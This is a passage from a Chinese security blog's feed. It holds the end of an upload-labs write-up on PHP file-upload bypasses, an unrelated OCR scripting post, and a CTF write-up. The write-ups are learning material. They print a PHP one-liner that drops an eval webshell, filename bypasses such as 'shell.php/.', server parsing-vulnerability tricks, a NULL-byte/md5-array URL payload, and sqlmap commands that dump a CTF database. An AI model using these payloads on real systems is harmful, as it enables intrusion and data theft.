class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>$ret = $this-&gt;move();</code>先进行move操作然后renamefile更改文件名，条件竞争上传图片马。</p><h1 id="19"><a href="#19" class="headerlink" title="19 /."></a>19 /.</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>move_uploaded_file会忽略掉文件末尾的/.，这里文件名可控，<br>通过修改save_name为<code>shell.php/.</code>绕过。<br><img src="https://i.imgur.com/N7s6DNk.png" alt=""><br>分析参考<br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=626</a><br><a href="http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html" target="_blank" rel="noopener">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</a></p><h1 id="20数组"><a href="#20数组" class="headerlink" title="20数组+/."></a>20数组+/.</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p><p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>后缀有白名单过滤,文件后缀名取<code>$file[count($file) - 1];</code>构造$file[0]为<code>shell.php/(reset(file))</code>,<code>$file[2]</code>为白名单后缀，<code>$file[count($file) - 1]</code>为空,最终move_uploaded_file会忽略掉/.,上传shell.php<br><img src="https://i.imgur.com/IJA7FYS.png" alt=""></p><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><p>解析漏洞是服务器端中间件的问题</p><h2 id="IIS-6-0解析利用方法有三种："><a href="#IIS-6-0解析利用方法有三种：" class="headerlink" title="IIS 6.0解析利用方法有三种："></a>IIS 6.0解析利用方法有三种：</h2><p>1.目录解析<br>建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种<br>/wooyun.asa<br>/wooyun.cer<br>/wooyun.cdx</p><h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h2><p>在正常图片URL后添加 /.php<br>小马如下</p><p>&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd]?&gt;’);?&gt;</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><h2 id="Nginx-lt-8-03"><a href="#Nginx-lt-8-03" class="headerlink" title="Nginx&lt;8.03"></a>Nginx&lt;8.03</h2><p>法1：同IIS 7.0/7.5<br>法2：xxx.jpg%00.php</p><p>参考</p><p><a href="https://skysec.top/2018/08/16/Upload-labs&amp;Upload%20Bypass%20Summarize/#%E5%9B%BE%E7%89%87%E6%B8%B2%E6%9F%93%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">https://skysec.top/2018/08/16/Upload-labs&amp;Upload%20Bypass%20Summarize/#%E5%9B%BE%E7%89%87%E6%B8%B2%E6%9F%93%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98</a>         </p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学的都是浅层，还需继续努力。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前端&quot;&gt;&lt;a href=&quot;#前端&quot; class=&quot;headerlink&quot; title=&quot;前端&quot;&gt;&lt;/a&gt;前端&lt;/h1&gt;&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1&quot;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;figure cl
      
    
    </summary>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>基于图片的文字识别</title>
    <link href="http://yoursite.com/2019/01/30/%E6%96%87%E5%AD%97%E8%AF%86%E5%88%AB/"/>
    <id>http://yoursite.com/2019/01/30/文字识别/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2019-01-30T12:13:12.989Z</updated>
    
    <content type="html"><![CDATA[<p>闲暇之余看了看关于识别图片提取文字得库。第一次首先尝试的是 Tesseract识别图片提取文字，识别得正确率不高。后来尝试调用百度ocr得API。不得不说百度对于中文识别做的很好。关于ocr这里参考<br><a href="https://zh.wikipedia.org/wiki/%E5%85%89%E5%AD%A6%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%85%89%E5%AD%A6%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB</a>总结一下就是ocr是指对文本资料的图像文件进行分析识别处理，获取文字及版面信息的过程。</p><h1 id="Tesseract"><a href="#Tesseract" class="headerlink" title="Tesseract"></a>Tesseract</h1><p>这里安装通过命令行pip安装，然后通过脚本测试了一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Languages</span>:</span></span><br><span class="line">    CHS = <span class="string">'chi_sim'</span></span><br><span class="line">    CHT = <span class="string">'chi_tra'</span></span><br><span class="line">    ENG = <span class="string">'eng'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img_to_str</span><span class="params">(image_path, lang=Languages.ENG)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> pytesseract.image_to_string(Image.open(image_path), lang)</span><br><span class="line"></span><br><span class="line">print(img_to_str(<span class="string">'1.jpg'</span>, lang=Languages.CHS))</span><br></pre></td></tr></table></figure><p>英文能正常识别。<br>中文不太友好。</p><p><img src="https://i.imgur.com/soJ6Jiq.png" alt=""></p><h1 id="百度OCR"><a href="#百度OCR" class="headerlink" title="百度OCR"></a>百度OCR</h1><p>参考接口说明写了一个脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipOcr   </span><br><span class="line"></span><br><span class="line">APP_ID= <span class="string">'#'</span></span><br><span class="line">API_KEY= <span class="string">'#'</span></span><br><span class="line">SECRET_KEY= <span class="string">'#'</span></span><br><span class="line"></span><br><span class="line">client = AipOcr(APP_ID,API_KEY,SECRET_KEY)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_content</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filePath, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">return</span> fp.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img_to_str</span><span class="params">(image_path)</span>:</span></span><br><span class="line">    image = get_file_content(image_path)</span><br><span class="line">    result = client.basicGeneral(image)  <span class="comment">#通用文字识别</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'words_result'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\n'</span>.join([w[<span class="string">'words'</span>] <span class="keyword">for</span> w <span class="keyword">in</span> result[<span class="string">'words_result'</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> img_to_str(<span class="string">'2.png'</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/WqXXkpL.png" alt=""><br>运行结果：<br>如果是直接打印result以字典形式出现，故要进行字典对应键值为words_result提取对应值。<br><img src="https://i.imgur.com/snHVQU4.png" alt=""></p><p><img src="https://i.imgur.com/nM6L0RA.png" alt=""></p><p>都是比较基础得东西，有空在深入研究关于训练集的词库训练。</p><p>参考链接： <a href="https://www.cnblogs.com/qlqwjy/p/10273543.html" target="_blank" rel="noopener">https://www.cnblogs.com/qlqwjy/p/10273543.html</a></p><p><a href="https://juejin.im/post/5a97f252f265da23884c79fb" target="_blank" rel="noopener">https://juejin.im/post/5a97f252f265da23884c79fb</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;闲暇之余看了看关于识别图片提取文字得库。第一次首先尝试的是 Tesseract识别图片提取文字，识别得正确率不高。后来尝试调用百度ocr得API。不得不说百度对于中文识别做的很好。关于ocr这里参考&lt;br&gt;&lt;a href=&quot;https://zh.wikipedia.org/
      
    
    </summary>
    
      <category term="tensflow" scheme="http://yoursite.com/categories/tensflow/"/>
    
    
      <category term="tensflow" scheme="http://yoursite.com/tags/tensflow/"/>
    
  </entry>
  
  <entry>
    <title>cumt双月赛</title>
    <link href="http://yoursite.com/2019/01/28/cumt1%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/01/28/cumt1月月赛/</id>
    <published>2019-01-27T16:00:00.000Z</published>
    <updated>2019-01-28T15:12:10.750Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>关键函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"^[0-9]+$"</span>, $a) === <span class="keyword">FALSE</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no must be number'</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($a,$white_list))&#123; </span><br><span class="line">            <span class="keyword">if</span>(strlen($a)&gt;<span class="number">1</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;img src='dark.png'&gt;&lt;br&gt;"</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></p><p>代码审计请求三个参数0ver&amp;0ver1&amp;0ver2，分别赋值给a,b,c。<br>考察两个点。构造0ver值绕过正则匹配，构造0ver1和0ver2值绕过md5比较。</p><ul><li>ereg函数存在NULL截断漏洞。   </li><li>md5不能处理数组，加密后将返回NULL使得md5($c)=md5($b)。   </li></ul><p><code>payload:http://202.119.201.199:32790?0ver=0%00&amp;0ver1[]=1&amp;0ver2[]=2</code></p><h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。<br>这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。<br><img src="https://i.loli.net/2019/01/28/5c4f1b07bceea.png" alt="1.png">   </p><h2 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h2><p>随手测试<code>http://bxs.cumt.edu.cn:30007/test/index.php?id=1</code>发现回显，id存在注入点。利用sqlmap<br>爆库<br><code>py -2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; --dbs</code><br><img src="https://i.loli.net/2019/01/28/5c4f1b5ad06f7.png" alt="2.png"><br>爆表<br><code>py -2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; -D security --tables</code><br><img src="https://i.loli.net/2019/01/28/5c4f1b6bb12f5.png" alt="3.png"><br>爆列<br><code>py -2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; -D security -T flagishere --columns</code><br><img src="https://i.loli.net/2019/01/28/5c4f1b7272774.png" alt="4.png"><br>爆字段<br><code>py -2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; -D security -T flagishere -C &quot;flag,id&quot; --dump</code><br><img src="https://i.loli.net/2019/01/28/5c4f1b757899c.png" alt="5.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h2><p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src="https://i.loli.net/2019/01/28/5c4f1b78c4cb2.png" alt="6.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h2><p>打开图片发现fgookwnl{_un_gaDy_0p}，分析可得是栅栏加密。附上解密脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 